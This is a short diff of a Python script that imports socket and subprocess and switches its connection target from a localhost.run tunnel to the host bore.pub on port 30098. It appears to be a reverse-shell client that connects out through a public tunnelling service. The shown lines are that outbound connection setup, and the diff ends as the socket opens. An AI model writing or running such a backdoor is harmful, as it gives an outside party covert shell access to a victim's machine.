@@ -2,11 +2,10 @@ import socket
 import subprocess
 import os
 
-# === НАСТРОЙКИ ===
-HOST = "a7319e78c34339.lhr.life"   # твой текущий туннель localhost.run
-PORT = 80
+HOST = "bore.pub"
+PORT = 30098
 
-print("[+] Trying to connect to your Mac via localhost.run...")
+print(f"[+] Trying to connect to {HOST}:{PORT}...")
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
